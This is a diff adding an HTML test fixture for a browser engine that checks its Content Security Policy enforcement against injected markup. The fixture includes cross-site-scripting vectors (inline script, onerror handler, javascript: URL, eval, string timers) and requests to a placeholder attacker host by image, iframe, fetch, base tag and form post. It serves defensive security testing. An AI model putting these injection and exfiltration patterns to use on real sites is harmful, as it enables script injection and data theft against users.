@@ -1,0 +1,73 @@
+<!doctype html>
+<!--
+  The adversarial site's injected markup (M33.8, docs/design/hardening.md).
+  A page of the victim's served with a strict policy, scripts and
+  styles by nonce, images, frames, connections and forms its own:
+
+    default-src 'self'; script-src 'nonce-N'; style-src 'nonce-N';
+    img-src 'self'; form-action 'self'; base-uri 'none'; frame-src 'none'
+
+  Between its own scripts is markup an attacker injected, which tries
+  every way of running code, styling the page, reaching the attacker's
+  host and moving the page's scripts there; its own scripts are made to
+  run strings the attacker wrote, as a careless page would. It logs,
+  last, one JSON line: the attacks that ran (pwned) and the attacks
+  made (ran); the attacker's host records what reached it, under
+  /pwned. After the line, with ?form, it sends the attacker's form,
+  which leaves the page. A style the page allows stands for one an
+  attacker could write under a laxer policy, and tries to match the
+  page's nonce by an attribute selector.
+  crates/engine/src/loader/adversarial_tests.rs runs it with the policy,
+  where nothing may succeed, and without it, where all must.
+-->
+<title>Injected markup</title>
+<script nonce="{{nonce}}">
+  const pwned = [];
+  const ran = [];
+  function pwn(what) {
+    pwned.push(what);
+  }
+  function attempt(what, run) {
+    ran.push(what);
+    try {
+      run();
+    } catch (e) {}
+  }
+  ran.push("inline script", "event handler", "style element", "style attribute", "base",
+    "nonce selector", "image", "frame", "form");
+</script>
+<script>pwn("inline script")</script>
+<img src="/missing.png" onerror="pwn('event handler')">
+<a id=link href="javascript:pwn('javascript url')"></a>
+<style>#probe1 { color: rgb(1, 2, 3) }</style>
+<p id=probe1></p>
+<p id=probe2 style="color: rgb(1, 2, 3)"></p>
+<img src="{{attacker}}/pwned?image">
+<iframe src="{{attacker}}/pwned?frame"></iframe>
+<form id=form action="{{attacker}}/pwned?form" method=post></form>
+<base href="{{attacker}}/">
+<script nonce="{{nonce}}" src="lib.js"></script>
+<style nonce="{{nonce}}">script[nonce="{{nonce}}"] { color: rgb(1, 2, 3) }</style>
+<script nonce="{{nonce}}">
+  attempt("eval", () => eval("pwn('eval')"));
+  attempt("function", () => new Function("pwn('function')")());
+  attempt("string timer", () => setTimeout("pwn('string timer')", 0));
+  attempt("webassembly", () =>
+    WebAssembly.compile(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0])).then(
+      () => pwn("webassembly"),
+      () => {},
+    ));
+  attempt("fetch", () => fetch("{{attacker}}/pwned?fetch", { mode: "no-cors" }).catch(() => {}));
+  attempt("javascript url", () => document.getElementById("link").click());
+  const colored = (element) => getComputedStyle(element).color == "rgb(1, 2, 3)";
+  onload = () => {
+    if (colored(document.getElementById("probe1"))) pwn("style element");
+    if (colored(document.getElementById("probe2"))) pwn("style attribute");
+    if (colored(document.querySelector("script"))) pwn("nonce selector");
+    setTimeout(() => {
+      const sorted = (list) => [...new Set(list)].sort();
+      console.log(JSON.stringify({ pwned: sorted(pwned), ran: sorted(ran) }));
+      if (location.search == "?form") document.getElementById("form").submit();
+    }, 100);
+  };
+</script>
